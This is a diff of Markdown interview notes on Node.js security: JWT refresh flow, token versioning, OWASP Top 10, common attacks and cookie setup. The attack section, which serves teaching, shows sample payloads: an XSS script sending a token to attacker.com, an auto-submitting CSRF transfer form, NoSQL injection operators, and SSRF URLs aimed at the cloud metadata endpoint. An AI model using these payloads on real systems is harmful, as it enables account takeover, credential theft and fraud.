@@ -9,279 +9,1421 @@
 
 ---
 
-## Q1 — How does JWT work? Explain the full flow.
-
-### ✅ Simple Explanation
-JWT (JSON Web Token) is a stateless authentication mechanism. The server signs a token with a secret; the client stores it and sends it with each request; the server verifies the signature without hitting the database.
-
-### 🧠 Deep Dive
-**JWT Structure** (3 parts, base64url-encoded, separated by `.`):
-```
-Header.Payload.Signature
-eyJ...  .eyJ...  .xyz...
-```
-- **Header**: `{ "alg": "HS256", "typ": "JWT" }`
-- **Payload**: `{ "sub": "userId", "iat": 1234, "exp": 1234 }`
-- **Signature**: `HMACSHA256(base64(header) + "." + base64(payload), secret)`
-
-**Access + Refresh token pattern:**
-- Access token: short-lived (15 min), stored in memory
-- Refresh token: long-lived (7 days), stored in httpOnly cookie
-- On access token expiry, use refresh token to get new access token
-
-**Why not store JWT in localStorage?** XSS attack can steal it. Use memory + httpOnly cookies.
-
-### 💻 Code Example
-```js
-const jwt = require('jsonwebtoken');
-
-// Sign tokens
-function generateTokens(userId) {
-  const accessToken = jwt.sign(
-    { sub: userId, type: 'access' },
-    process.env.JWT_ACCESS_SECRET,
-    { expiresIn: '15m' }
-  );
-
-  const refreshToken = jwt.sign(
-    { sub: userId, type: 'refresh' },
-    process.env.JWT_REFRESH_SECRET,
-    { expiresIn: '7d' }
-  );
-
-  return { accessToken, refreshToken };
-}
-
-// Auth middleware
-function authenticateToken(req, res, next) {
-  const authHeader = req.headers.authorization;
-  const token = authHeader?.startsWith('Bearer ') && authHeader.split(' ')[1];
-
-  if (!token) return res.status(401).json({ error: 'No token' });
-
-  try {
-    const payload = jwt.verify(token, process.env.JWT_ACCESS_SECRET);
-    if (payload.type !== 'access') throw new Error('Wrong token type');
-    req.user = payload;
-    next();
-  } catch (err) {
-    if (err.name === 'TokenExpiredError') {
-      return res.status(401).json({ error: 'Token expired', code: 'TOKEN_EXPIRED' });
-    }
-    res.status(401).json({ error: 'Invalid token' });
-  }
-}
-
-// Refresh token endpoint
-app.post('/auth/refresh', async (req, res) => {
-  const refreshToken = req.cookies.refreshToken;
-  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });
-
-  try {
-    const payload = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
-    // Optional: check if token is in a revocation list (Redis)
-    const { accessToken, refreshToken: newRefresh } = generateTokens(payload.sub);
-
-    res.cookie('refreshToken', newRefresh, {
-      httpOnly: true,
-      secure: process.env.NODE_ENV === 'production',
-      sameSite: 'strict',
-      maxAge: 7 * 24 * 60 * 60 * 1000
-    });
-
-    res.json({ accessToken });
-  } catch {
-    res.status(401).json({ error: 'Invalid refresh token' });
-  }
-});
-
-// Logout — revoke refresh token
-app.post('/auth/logout', async (req, res) => {
-  const token = req.cookies.refreshToken;
-  if (token) {
-    // Add to Redis blacklist until expiry
-    await redis.setex(`blacklist:${token}`, 7 * 24 * 3600, '1');
-  }
-  res.clearCookie('refreshToken');
-  res.json({ message: 'Logged out' });
-});
-```
-
-### ⚠️ Common Mistakes
-- Using the same secret for access and refresh tokens
-- Storing JWTs in localStorage (XSS vulnerable)
-- Not validating `exp` claim — `jwt.verify` does this, but only if you use it
-- Forgetting that JWTs can't be invalidated without a blacklist
-
-### 🎯 Interview Tip
-> "JWT is stateless — perfect for microservices. For logout or token revocation, I use a Redis blacklist. Access tokens go in memory; refresh tokens in httpOnly cookies to protect against XSS."
+## Q1 — How does JWT work? Explain the full flow with refresh token.
 
 ---
 
-## Q2 — What are the OWASP Top 10 vulnerabilities relevant to Node.js?
-
-### ✅ Simple Explanation
-OWASP Top 10 is the standard list of critical web security risks. As a Node.js developer, these are the ones you must know and protect against.
-
-### 🧠 Deep Dive
-
-| # | Vulnerability | Node.js Example | Fix |
-|---|---|---|---|
-| A01 | Broken Access Control | No authorization check on routes | Always verify user owns resource |
-| A02 | Cryptographic Failures | MD5 password hashing | Use bcrypt/argon2 |
-| A03 | Injection | MongoDB query injection | Sanitize inputs, use mongoose |
-| A05 | Security Misconfiguration | Default Express headers | Use helmet |
-| A07 | Auth Failures | Weak JWTs | Strong secrets, short expiry |
-| A09 | Logging Failures | Not logging auth events | Structured logging |
-
-### 💻 Code Example
-```js
-// A03: NoSQL Injection — MongoDB
-// ❌ Vulnerable
-app.post('/login', async (req, res) => {
-  const user = await User.findOne({
-    email: req.body.email,    // attacker sends: { "$gt": "" }
-    password: req.body.password
-  });
-});
-// Attack: { "email": { "$gt": "" }, "password": { "$gt": "" } } → logs in as first user!
-
-// ✅ Fix: sanitize with express-mongo-sanitize
-const mongoSanitize = require('express-mongo-sanitize');
-app.use(mongoSanitize()); // strips $ and . from req.body, params, query
-
-// A02: Cryptographic Failure — password hashing
-const bcrypt = require('bcryptjs');
-
-// ❌ Never use: crypto.createHash('md5')
-// ✅ Use bcrypt
-const SALT_ROUNDS = 12;
-async function hashPassword(plaintext) {
-  return bcrypt.hash(plaintext, SALT_ROUNDS);
-}
-async function verifyPassword(plaintext, hash) {
-  return bcrypt.compare(plaintext, hash); // constant-time comparison
-}
-
-// A05: Security Misconfiguration
-const helmet = require('helmet');
-app.use(helmet()); // sets 14 security headers:
-// X-Content-Type-Options: nosniff
-// X-Frame-Options: DENY
-// Content-Security-Policy
-// Strict-Transport-Security
-// X-XSS-Protection
-
-// Remove Express fingerprint
-app.disable('x-powered-by'); // or helmet handles it
-
-// A01: Broken Access Control
-app.delete('/todos/:id', requireAuth, async (req, res) => {
-  const todo = await Todo.findById(req.params.id);
-  if (!todo) return res.status(404).json({ error: 'Not found' });
-  
-  // ✅ Verify ownership — don't just check auth, check authorization
-  if (todo.userId.toString() !== req.user.sub) {
-    return res.status(403).json({ error: 'Forbidden' });
-  }
-  
-  await todo.deleteOne();
-  res.status(204).send();
-});
-```
-
-### ⚠️ Common Mistakes
-- Authentication ≠ Authorization — checking JWT is valid doesn't mean user owns the resource
-- Using `==` instead of `===` for secret comparisons — timing attacks
-
-### 🎯 Interview Tip
-> "OWASP A01 (Broken Access Control) is #1 for a reason — I always check both authentication (is this a valid user?) AND authorization (does this user own this resource?)."
+- Stateless authentication mechanism
+    
+- Used to securely transfer data between client & server
+    
+- Eliminates need for server-side session storage
+    
 
 ---
 
-## Q3 — How do you protect against common Node.js attacks?
+## 🧩 Structure of JWT
 
-### ✅ Simple Explanation
-Use rate limiting, input sanitization, helmet headers, and HTTPS for most attack vectors. Know what each library does.
+A JWT consists of **3 parts**:
 
-### 🧠 Deep Dive
-**Attack types and fixes:**
+```
+HEADER.PAYLOAD.SIGNATURE
+```
 
-| Attack | Fix |
+---
+
+### 1. Header
+
+Contains metadata about the token
+
+```json
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+```
+
+---
+
+### 2. Payload
+
+Contains claims (data)
+
+```json
+{
+  "userId": "123",
+  "email": "user@test.com",
+  "exp": 1712345678
+}
+```
+
+#### Types of claims:
+
+- **Registered** → `exp`, `iat`, `iss`
+    
+- **Public** → shared standard fields
+    
+- **Private** → custom (e.g. userId)
+    
+
+---
+
+### 3. Signature
+
+Ensures token integrity (cannot be tampered)
+
+```
+HMACSHA256(
+  base64(header) + "." + base64(payload),
+  secret
+)
+```
+
+👉 If payload changes → signature becomes invalid
+
+---
+
+## 🔁 How JWT Authentication Works (Memory + Cookie Strategy)
+
+### 🟢 Login Flow
+
+1. Client → `/login`
+    
+2. Server:
+    
+    - validates credentials
+        
+    - generates:
+        
+        - accessToken (short-lived)
+            
+        - refreshToken (long-lived)
+            
+3. Server:
+    
+    - returns accessToken (response)
+        
+    - sets refreshToken (HTTP-only cookie)
+        
+    - stores refreshToken in DB
+        
+
+---
+
+### 🟢 Client Storage
+
+- Access Token → **in memory (React state / store)**
+    
+- Refresh Token → **HTTP-only cookie**
+    
+
+---
+
+### 🟢 API Requests
+
+Client sends:
+
+```
+Authorization: Bearer <accessToken>
+```
+
+Server:
+
+- verifies signature
+    
+- checks expiry
+    
+
+---
+
+### 🟡 Token Expiry Handling
+
+1. Server returns `401 Unauthorized`
+    
+2. Client interceptor calls `/refresh`
+    
+
+---
+
+### 🟡 Refresh Flow
+
+1. Browser sends refreshToken automatically (cookie)
+    
+2. Server:
+    
+    - validates refresh token
+        
+    - rotates refresh token (new one issued)
+        
+    - returns new accessToken
+    - sets refreshToken (HTTP-only cookie)
+        
+    - stores refreshToken in DB
+        
+
+---
+
+### 🟢 Retry
+
+- Client updates token in memory
+    
+- Retries original request
+    
+
+---
+
+### 🔴 Failure Case
+
+- If refresh fails (`403 Forbidden`)
+    
+    - logout user
+        
+    - clear state
+        
+
+---
+
+## 🔐 Security Model
+
+### Access Token
+
+- Short-lived (10–15 min)
+    
+- Stored in memory
+    
+- Sent in Authorization header
+    
+
+---
+
+### Refresh Token
+
+- Long-lived
+    
+- Stored in HTTP-only cookie
+    
+- Rotated on every refresh
+    
+- Stored in DB
+    
+
+---
+
+## ⚖️ Why This Approach?
+
+### ✅ Advantages
+
+- Stateless backend (no session store needed)
+    
+- Scales easily
+    
+- Secure against XSS (no localStorage)
+    
+- Automatic session continuation via refresh
+    
+
+---
+
+### ❌ Trade-offs
+
+- Requires interceptor logic
+    
+- Slight complexity in refresh handling
+    
+- Needs careful concurrency control
+    
+
+---
+
+## 🧠 Key Concepts
+
+### Stateless Authentication
+
+- Server does not store session
+    
+- JWT itself carries identity
+    
+
+---
+
+### Token Rotation
+
+- Every refresh → new refresh token
+    
+- Old token invalidated
+    
+
+---
+
+### Reuse Detection
+
+- If old refresh token reused → possible attack
+    
+- Force logout everywhere
+    
+
+---
+
+## ⚡ Mental Model
+
+```
+Access Token  → Short-lived, used frequently
+Refresh Token → Long-lived, used rarely, highly secure
+```
+
+---
+
+## ✅ Final Takeaway
+
+JWT enables:
+
+- **Secure**
+    
+- **Stateless**
+    
+- **Scalable authentication**
+    
+
+👉 Best practice:
+
+- Access token → memory
+    
+- Refresh token → HTTP-only cookie
+    
+- Use interceptors + rotation
+    
+
+---
+## Q2 —  How to Reduce the Impact of Stolen JWT (Access Token) or Refresh Token?
+
+---
+
+## 🎯 Goal
+
+Even if an access token is stolen:
+
+- ⏱️ Limit **time of misuse**
+    
+- 🔒 Limit **what attacker can do**
+    
+- 🚫 Enable **instant revocation**
+    
+
+---
+
+## ⚠️ Reality
+
+> A stolen access token **cannot be fully blocked immediately**  
+> 👉 Strategy = **Limit + Contain + Revoke Fast**
+
+---
+
+## ✅ Must-Use Security Measures
+
+---
+
+### 1. ⏱️ Short-Lived Access Token (MOST IMPORTANT)
+
+- Expiry: **10–15 minutes max**
+    
+- High-security apps: **5 minutes**
+    
+
+👉 Reduces attacker window drastically
+
+---
+
+### 2. 🌐 Enforce HTTPS Everywhere
+
+- All APIs + frontend must use HTTPS
+    
+
+👉 Prevents token interception (MITM attacks)
+
+---
+
+### 3. 🧠 Store Access Token in Memory Only
+
+- React state / Redux / in-memory variable
+    
+- ❌ Avoid `localStorage` / `sessionStorage`
+    
+
+👉 Prevents easy theft via XSS
+
+---
+
+### 4. 🍪 Use HTTP-only Secure Cookie for Refresh Token
+
+```js
+{
+  httpOnly: true,
+  secure: true,
+  sameSite: "Strict" // or "Lax"
+}
+```
+
+👉 Ensures attacker **cannot extend session**
+
+---
+
+### 5. 🔁 Refresh Token Rotation
+
+- Every `/refresh`:
+    
+    - Issue new refresh token
+        
+    - Invalidate old one
+        
+
+👉 Prevents long-term session hijacking
+
+---
+
+### 6. 🔄 Proper 401 → Refresh Flow
+
+- On `401 Unauthorized`:
+    
+    - Call `/refresh`
+        
+    - Retry original request **once only**
+        
+
+👉 Maintains UX + prevents infinite loops
+
+---
+
+### 7. 🚪 Logout on Refresh Failure
+
+- If `/refresh` returns `403`:
+    
+    - Clear tokens
+        
+    - Redirect to login
+        
+
+👉 Stops unauthorized session continuation
+
+---
+
+# 🔥 8. 🧾 Token Versioning (DETAILED)
+
+---
+
+## 🧠 What is Token Versioning?
+
+A **server-controlled version number** stored in DB that is:
+
+- Embedded in JWT at issue time
+    
+- Verified on every request
+    
+
+👉 Acts as a **global kill switch for all tokens**
+
+---
+
+## 🟢 How It Works (Flow)
+
+### Step 1 — Store in DB on create user
+
+```js
+user = {
+  _id: "123",
+  tokenVersion: 1
+}
+```
+
+---
+
+### Step 2 — Embed in JWT
+
+```js
+jwt.sign({
+  userId: user._id,
+  tokenVersion: user.tokenVersion
+})
+```
+
+---
+
+### Step 3 — Validate on Every Request
+
+```js
+if (decoded.tokenVersion !== user.tokenVersion) {
+  throw "Token revoked";
+}
+```
+
+---
+
+## 🔥 Why This Is Powerful
+
+- JWT is stateless ❌
+    
+- Token versioning makes it **revocable** ✅
+    
+- One DB update → **invalidate all sessions instantly**
+    
+
+---
+
+## 🔴 When to INCREMENT tokenVersion (VERY IMPORTANT)
+
+👉 This is where most developers fail
+
+---
+
+### ✅ 1. Logout from All Devices
+
+```js
+user.tokenVersion += 1;
+```
+
+👉 Invalidates all active access tokens
+
+---
+
+### ✅ 2. Password Change (MANDATORY)
+
+```js
+user.password = newPassword;
+user.tokenVersion += 1;
+```
+
+👉 Prevents attacker continuing after password reset
+
+---
+
+### ✅ 3. Refresh Token Reuse Detected (SECURITY BREACH)
+
+Scenario:
+
+- Old refresh token reused after rotation
+    
+
+👉 Action:
+
+```js
+user.tokenVersion += 1;
+```
+
+👉 Immediately kill all sessions
+
+---
+
+### ✅ 4. Suspicious Activity Detected
+
+Examples:
+
+- Sudden IP change (India → Europe)
+    
+- Unusual request spikes
+    
+- Accessing sensitive endpoints abnormally
+    
+
+👉 Action:
+
+```js
+user.tokenVersion += 1;
+```
+
+---
+
+### ✅ 5. Admin Force Logout
+
+```js
+await User.updateOne(
+  { _id: userId },
+  { $inc: { tokenVersion: 1 } }
+);
+```
+
+👉 Useful for:
+
+- Compromised accounts
+    
+- Policy enforcement
+    
+
+---
+
+### ✅ 6. Account Recovery / Email Change
+
+👉 If identity changes → invalidate sessions
+
+---
+
+## ⚠️ When NOT to Increment
+
+🚫 On every refresh  
+🚫 On every login  
+🚫 On normal API usage
+
+👉 Otherwise:
+
+- Users get logged out constantly ❌
+    
+- System becomes unusable ❌
+    
+
+---
+
+## 🔄 Full Lifecycle Example
+
+```text
+1. User logs in → tokenVersion = 1
+
+2. Token issued (version=1)
+
+3. Attacker steals token 😬
+
+4. User changes password
+   → tokenVersion = 2
+
+5. Attacker uses old token (version=1)
+   → ❌ Rejected instantly
+
+6. User logs in again
+   → gets token(version=2)
+```
+
+---
+
+## ⚠️ Critical Requirement
+
+> Token versioning ONLY works if validated on EVERY request
+
+```js
+if (decoded.tokenVersion !== user.tokenVersion) reject();
+```
+
+👉 Skipping this = zero security
+
+we can use caching for this to store token version for user
+
+---
+
+## 🧠 Mental Model
+
+> tokenVersion = **server-side session authority over stateless JWT**
+
+---
+
+## 🧩 Combined with Other Layers
+
+|Layer|Purpose|
 |---|---|
-| Brute force | Rate limiting (`express-rate-limit`) |
-| DDoS | Rate limiting + cloud WAF |
-| XSS | CSP headers (helmet), sanitize HTML |
-| CSRF | SameSite cookies, CSRF tokens |
-| SQL/NoSQL injection | Parameterized queries, sanitize |
-| ReDoS | Avoid complex regex on user input |
-| Path traversal | `path.resolve` + prefix check |
+|Short expiry|Limits time|
+|Refresh rotation|Prevents persistence|
+|Token versioning|Instant kill switch|
+|Step-up auth|Protects sensitive actions|
 
-### 💻 Code Example
+---
+
+## 🔐 9. Step-Up Authentication (Critical Actions)
+
+- Require password / OTP for:
+    
+    - Payments
+        
+    - Password change
+        
+    - Email update
+        
+
+---
+
+## 🚦 10. Rate Limiting
+
+- Limit API requests per token/IP
+    
+
+👉 Prevents abuse if compromised
+
+---
+
+## ⚡ Production Checklist
+
+-  Access token expiry ≤ 15 min
+    
+-  HTTPS enabled everywhere
+    
+-  Access token stored in memory
+    
+-  Refresh token in httpOnly cookie
+    
+-  Refresh token rotation implemented
+    
+-  401 → refresh → retry flow
+    
+-  Logout on refresh failure
+    
+-  Token versioning implemented
+    
+-  tokenVersion increment on critical events
+    
+-  Middleware validation for version
+    
+-  Rate limiting applied
+    
+-  Step-up auth for sensitive APIs
+    
+
+---
+
+## 🧠 Final Takeaway
+
+> You cannot stop a stolen JWT from being used  
+> 👉 You **limit its lifetime, restrict power, and revoke instantly using tokenVersion**
+
+---
+
+## Q3 — What are the OWASP Top 10 vulnerabilities relevant to Node.js?
+
+---
+
+## 🎯 Core Idea
+
+The OWASP Top 10 is language-agnostic, but Node.js apps are especially vulnerable due to:
+
+- Heavy use of npm packages
+    
+- JSON-based APIs
+    
+- Async flows (harder to track security gaps)
+    
+
+---
+
+# 🚨 1. Broken Access Control
+
+### ❓ Problem
+
+Users access data/resources without proper authorization.
+
+### 💥 Node.js Example
+
+```js
+app.get('/admin', (req, res) => {
+  res.send("Admin data"); // ❌ no role check
+});
+```
+
+### ✅ Fix (RBAC Middleware)
+
+```js
+const authorize = (roles = []) => {
+  return (req, res, next) => {
+    if (!roles.includes(req.user.role)) {
+      return res.status(403).json({ message: "Forbidden" });
+    }
+    next();
+  };
+};
+
+app.get('/admin', authenticate, authorize(['admin']), handler);
+```
+
+---
+
+# 🔑 2. Cryptographic Failures
+
+### ❓ Problem
+
+Weak encryption / plain-text sensitive data.
+
+### 💥 Mistakes
+
+- Storing passwords directly
+    
+- Using MD5/SHA1
+    
+
+### ✅ Fix
+
+```js
+const bcrypt = require('bcrypt');
+const hash = await bcrypt.hash(password, 10);
+```
+
+✔ Always:
+
+- Use bcrypt/argon2
+    
+- Use HTTPS
+    
+- Store secrets in `.env`
+    
+
+---
+
+# 💉 3. Injection (NoSQL / Command)
+
+### ❓ Problem
+
+User input alters queries/commands.
+
+### 💥 NoSQL Injection
+
+```js
+User.find({ username: req.body.username }); // ❌ unsafe
+```
+
+Attack:
+
+```json
+{ "username": { "$ne": null } }
+```
+
+### ✅ Fix
+
+```js
+const Joi = require('joi');
+
+const schema = Joi.object({
+  username: Joi.string().required()
+});
+
+await schema.validateAsync(req.body);
+
+User.find({ username: req.body.username });
+```
+
+---
+
+# 🧠 4. Insecure Design
+
+### ❓ Problem
+
+Security not considered in architecture.
+
+### 💥 Examples
+
+- No rate limiting
+    
+- Infinite login attempts
+    
+- No token expiry
+    
+
+### ✅ Fix
+
 ```js
 const rateLimit = require('express-rate-limit');
-const slowDown = require('express-slow-down');
-const xss = require('xss');
 
-// Rate limiting — per IP
-const loginLimiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 min
-  max: 5,                    // 5 attempts
-  message: 'Too many login attempts',
-  standardHeaders: true,
-  legacyHeaders: false,
-  skipSuccessfulRequests: true,
-});
-app.post('/auth/login', loginLimiter, loginHandler);
-
-// Slow down before blocking
-const speedLimiter = slowDown({
+app.use('/login', rateLimit({
   windowMs: 15 * 60 * 1000,
-  delayAfter: 50,
-  delayMs: (hits) => hits * 100, // delay grows with each hit
-});
-
-// Path traversal prevention
-app.get('/files/:filename', (req, res) => {
-  const filename = req.params.filename;
-  const uploadDir = path.resolve('./uploads');
-  const filePath = path.resolve(uploadDir, filename);
-
-  // ✅ Ensure resolved path is within upload directory
-  if (!filePath.startsWith(uploadDir)) {
-    return res.status(400).json({ error: 'Invalid filename' });
-  }
-
-  res.sendFile(filePath);
-});
-
-// XSS sanitization for stored content
-function sanitizeUserInput(input) {
-  return xss(input, {
-    whiteList: {}, // no HTML tags allowed
-    stripIgnoreTag: true,
-  });
-}
-
-// CSRF protection for cookie-based auth
-const csrf = require('csurf');
-const csrfProtection = csrf({ cookie: { httpOnly: true, secure: true } });
-app.use(csrfProtection);
-app.get('/form', (req, res) => {
-  res.render('form', { csrfToken: req.csrfToken() });
-});
+  max: 5
+}));
 ```
-
-### ⚠️ Common Mistakes
-- Rate limiting only on login — also rate limit password reset, OTP endpoints
-- Not using `path.resolve` before serving files — path traversal (`../../etc/passwd`)
-- Trusting `req.ip` without `trust proxy` configured — returns wrong IP, rate limiting bypassed
-
-### 🎯 Interview Tip
-> "I apply rate limiting at the API gateway level (Nginx / AWS API Gateway) AND in the app itself as defense-in-depth. Helmet takes care of headers, but you still need input sanitization and access control."
 
 ---
 
+# ⚙️ 5. Security Misconfiguration
+
+### ❓ Problem
+
+Unsafe defaults / misconfigured server
+
+### 💥 Examples
+
+```js
+app.use(cors()); // ❌ allows all origins
+```
+
+### ✅ Fix
+
+```js
+const helmet = require('helmet');
+app.use(helmet());
+
+app.use(cors({
+  origin: ['https://yourdomain.com']
+}));
+```
+
+---
+
+# 📦 6. Vulnerable & Outdated Components
+
+### ❓ Problem
+
+Using insecure npm packages
+
+### 💥 Risk
+
+- Supply chain attacks
+    
+- Deep dependency issues
+    
+
+### ✅ Fix
+
+```bash
+npm audit
+npm audit fix
+```
+
+✔ Use:
+
+- Snyk
+    
+- Dependabot
+    
+- Lock files
+    
+
+---
+
+# 🔐 7. Authentication Failures (JWT Focus)
+
+### ❓ Problem
+
+Broken login/session handling
+
+### 💥 Common JWT Issues
+
+- Long-lived tokens
+    
+- No logout
+    
+- No rotation
+    
+
+---
+
+## ✅ Best Practice JWT Flow
+
+### Access Token
+
+- Short-lived (15 min)
+    
+
+### Refresh Token
+
+- Stored in DB / Redis
+    
+- Rotated on every use
+    
+
+---
+
+## 🔁 Refresh Token Rotation (Important)
+
+```js
+if (storedToken !== incomingToken) {
+  // reuse detected
+  revokeAllSessions(userId);
+}
+```
+
+---
+
+## 🧠 Optimization (IMPORTANT for you)
+
+Instead of DB hit every request:
+
+### Option 1: Redis
+
+```js
+redis.get(userId); // tokenVersion
+```
+
+### Option 2: Token Version in JWT
+
+```js
+if (decoded.tokenVersion !== user.tokenVersion) reject();
+```
+
+✔ Best combo:
+
+- Access token → stateless
+    
+- Refresh token → DB/Redis tracked
+    
+
+---
+
+# 🧾 8. Data Integrity Failures
+
+### ❓ Problem
+
+Trusting unverified packages/data
+
+### 💥 Example
+
+- Malicious npm package
+    
+
+### ✅ Fix
+
+- Use `package-lock.json`
+    
+- Avoid random packages
+    
+- Verify sources
+    
+
+---
+
+# 📊 9. Logging & Monitoring Failures
+
+### ❓ Problem
+
+No visibility into attacks
+
+### 💥 Missing Logs
+
+- Failed logins
+    
+- Token misuse
+    
+
+### ✅ Fix
+
+```js
+logger.warn("Failed login attempt", { user });
+```
+
+✔ Use:
+
+- Winston / Pino
+    
+- Central logging (ELK)
+    
+
+---
+
+# 🌐 10. SSRF (Server-Side Request Forgery)
+
+### ❓ Problem
+
+Server makes malicious requests
+
+### 💥 Example
+
+```js
+axios.get(req.body.url); // ❌ dangerous
+```
+
+### ✅ Fix
+
+```js
+const allowedDomains = ['api.trusted.com'];
+
+if (!allowedDomains.includes(new URL(url).hostname)) {
+  throw new Error("Blocked");
+}
+```
+
+---
+
+# 🔥 Node.js-Specific Extra Risks
+
+## 1. Prototype Pollution
+
+```js
+lodash.merge({}, userInput); // ❌ risky
+```
+
+## 2. Event Loop Blocking (DoS)
+
+```js
+while(true) {} // ❌ blocks server
+```
+
+## 3. Unsafe JWT Storage
+
+- ❌ localStorage
+    
+- ✅ HTTP-only cookies
+    
+
+---
+
+# ⚡ Final Interview Summary (Say This)
+
+👉 "In Node.js, the most critical OWASP risks are broken access control, injection (especially NoSQL), insecure JWT handling, and vulnerable npm dependencies. I mitigate them using strict input validation (Joi/Zod), RBAC middleware, secure JWT rotation with Redis, rate limiting, and dependency auditing."
+
+---
+
+# 🧠 Your Priority Checklist (Real-World)
+
+✔ Input validation everywhere  
+✔ RBAC middleware  
+✔ JWT rotation + reuse detection  
+✔ Rate limiting on auth APIs  
+✔ npm audit + dependency hygiene  
+✔ Secure headers (helmet)  
+✔ Logging + monitoring
+
+---
+
+# 🚀 Pro Tip (Senior-Level Insight)
+
+👉 "Security is not a feature — it's a system design concern."
+
+Always think:
+
+- What if token is stolen?
+    
+- What if user manipulates request?
+    
+- What if dependency is compromised?
+    
+---
+
+## Q3 — What are different types of attacks and how do you protect against common Node.js attacks?
+
+---
+
+## 🔴 1. Injection (SQL / NoSQL / Command)
+
+**What:** Untrusted input executed as code
+
+**💣 Attack Flow:**
+
+1. Find input (login/search)
+    
+2. Send crafted payload (`$ne`, `$gt`)
+    
+3. DB treats it as query logic
+    
+4. Auth bypass / data leak
+    
+
+**Example:**
+
+```json
+{ "email": { "$ne": null }, "password": { "$ne": null } }
+```
+
+**Fix:** Validate + sanitize + parameterized queries
+
+---
+
+## 🔴 2. Authentication & JWT Attacks
+
+**What:** Token misuse
+
+**💣 Attack Flow:**
+
+1. Steal token (via XSS / logs)
+    
+2. OR crack weak secret
+    
+3. Reuse/forge token
+    
+4. Access protected APIs
+    
+
+**Fix:** HTTP-only cookies, short expiry, rotation
+
+---
+
+## 🔴 3. XSS (Cross-Site Scripting)
+
+**What:** Inject JS into UI
+
+**💣 Attack Flow (Stored XSS):**
+
+1. Attacker submits input:
+    
+
+```html
+<script>
+fetch("https://attacker.com?token=" + localStorage.getItem("token"))
+</script>
+```
+
+2. Server stores it in DB
+    
+3. Another user opens page, lets say user listing
+    
+4. Backend returns stored content
+    
+5. Frontend renders without escaping
+    
+6. Script executes in browser
+    
+7. Token/session stolen
+    
+
+**Impact:** Account takeover
+
+**Fix:**
+
+- Escape output (EJS, etc.)
+    
+- Avoid `innerHTML`
+    
+- Sanitize (DOMPurify)
+    
+- Use **helmet** → enables CSP
+    
+
+**CSP Example:**
+
+```js
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"]
+    }
+  }
+}));
+```
+
+➡️ Blocks inline/malicious scripts
+
+---
+
+## 🔴 4. CSRF (Cross-Site Request Forgery)
+
+**What:** Trick browser to send request
+
+**💣 Real Flow (Bank Example):**
+
+1. User logs into `bank.com` → cookie stored
+    
+2. User visits phishing site
+    
+3. Attacker page:
+    
+
+```html
+<body onload="document.forms[0].submit()">
+<form action="https://bank.com/api/transfer" method="POST">
+  <input type="hidden" name="amount" value="10000" />
+  <input type="hidden" name="to" value="attacker" />
+</form>
+</body>
+```
+
+4. Browser auto-submits
+    
+5. Cookies auto-attached
+    
+6. Server trusts request
+    
+7. Money transferred
+    
+
+**Fix:** SameSite cookies, CSRF token, origin check
+
+---
+
+## 🔴 5. SSRF (Server-Side Request Forgery)
+
+**What:** Server makes attacker-controlled request
+
+**💣 Attack Flow:**
+
+1. Vulnerable API:
+    
+
+```js
+app.get("/fetch", async (req, res) => {
+  const response = await fetch(req.query.url);
+  res.send(await response.text());
+});
+```
+
+2. Attacker sends:
+    
+
+```
+/fetch?url=http://localhost:3000/admin
+```
+
+3. Server calls internal service
+    
+4. Returns sensitive data
+    
+
+**💣 Cloud Attack:**
+
+```
+/fetch?url=http://169.254.169.254/latest/meta-data/
+```
+
+➡️ Leak credentials
+
+**Fix:** Allowlist, block private IPs, validate DNS
+
+---
+
+## 🔴 6. Brute Force / Credential Stuffing / DoS
+
+**💣 Attack Flow:**
+
+1. Use leaked creds
+    
+2. Automate login attempts
+    
+3. Gain access / overload server
+    
+
+**Fix:** Rate limit, CAPTCHA, lock, bcrypt
+
+---
+
+## 🔴 7. File Upload Vulnerabilities
+
+**💣 Attack Flow:**
+
+1. Upload malicious file
+    
+2. Stored insecurely
+    
+3. Access via URL
+    
+4. Execute
+    
+
+**Fix:** Validate type/content, rename, limit size
+
+---
+
+## 🔴 8. Path Traversal
+
+**💣 Attack Flow:**
+
+1. Inject `../../`
+    
+2. Server resolves path
+    
+3. Sensitive file returned
+    
+
+**Fix:** `path.resolve`, allowlist, block traversal
+
+---
+
+# ⚡ Golden Rule
+
+> Never trust user input  
+> Validate → Sanitize → Restrict → Monitor
+
+---
+
+# Q4 — What is Cookie and How to do Secure Cookie Setup in Node.js?
+
+---
+
+## 🧠 What is a Cookie?
+
+> Small data stored by browser for a domain  
+> Automatically sent with every request to that domain
+
+```text
+token = abc123
+```
+
+---
+
+## 🔁 How it Works
+
+### 1. Server sets cookie
+
+```http
+Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+---
+
+### 2. Browser stores it
+
+- Saved for `yourapp.com`
+    
+
+---
+
+### 3. Browser auto-sends
+
+```http
+Cookie: token=abc123
+```
+
+👉 No manual work—browser handles it
+
+---
+
+## 🛠️ How to Use in Node.js
+
+### ✅ Set Secure Cookie
+
+```js
+res.cookie("token", token, {
+  httpOnly: true,              // no JS access (XSS safe)
+  secure: true,                // HTTPS only
+  sameSite: "Strict",          // CSRF protection
+  maxAge: 15 * 60 * 1000       // expiry (15 min)
+});
+```
+
+---
+
+### ✅ Read Cookie
+
+```js
+req.cookies.token   // using cookie-parser
+```
+
+---
+
+### ✅ Clear Cookie
+
+```js
+res.clearCookie("token");
+```
+
+---
+
+## 🔐 Important Flags (Must Know)
+
+- `httpOnly` → prevents JS access → 🛡️ XSS
+    
+- `secure` → HTTPS only → 🛡️ MITM
+    
+- `sameSite` → blocks cross-site → 🛡️ CSRF
+    
+- `maxAge` → limits lifetime
+    
+
+---
+
+## ⚠️ Best Practices
+
+- Use short-lived tokens (≈15 min)
+    
+- Store only token/session ID (no sensitive data)
+    
+- Use `SameSite=Lax` if Strict breaks flows
+    
+- Always use HTTPS in production
+    
+- Clear cookie on logout
+    
+
+---
+
+## 🧠 Mental Model
+
+> Cookie = browser-stored ID card  
+> Server gives it → browser keeps it → browser shows it automatically
+
+---
+
+## ⚡ Summary
+
+> Cookies enable authentication by maintaining state  
+> Secure setup = httpOnly + secure + sameSite + expiry
+
+---
 ## Q4 — What is OAuth 2.0 and how does it work with Node.js?
 
 ### ✅ Simple Explanation
